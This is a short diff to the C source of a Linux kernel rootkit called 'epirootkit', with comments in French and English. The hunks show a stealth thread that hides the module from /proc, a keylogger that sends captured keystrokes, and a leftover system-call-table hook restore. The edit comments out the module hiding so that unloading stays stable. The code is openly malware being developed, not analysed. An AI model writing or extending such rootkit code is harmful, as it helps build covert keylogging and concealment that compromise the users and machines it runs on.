@@ -384,7 +384,7 @@ static int stealth_thread(void *data) {
     unsigned long flags;
     while (!kthread_should_stop()) {
         // Masquer les traces dans /proc
-        hide_module();
+        // hide_module(); // Commenté pour stabiliser rmmod
         // Nettoyer les logs
         if (g_keylog_enabled) {
             keylog_send_buffer();
@@ -1012,7 +1012,7 @@ static void __exit epirootkit_exit(void) {
     // if (original_write) sys_call_table[__NR_write] = (unsigned long)original_write;
 
     // Unhide module
-    // unhide_module(); // This should be called if hide_module was called
+    // unhide_module(); // Commenté car hide_module l'est aussi, et la logique est à revoir
 
     // Cleanup keylogger
     keylog_buffer_cleanup();
@@ -1196,4 +1196,3 @@ static int in4_pton(const char *src, int srclen, u8 *dst, int delim, const char 
     return 1;
 }
 #endif
-
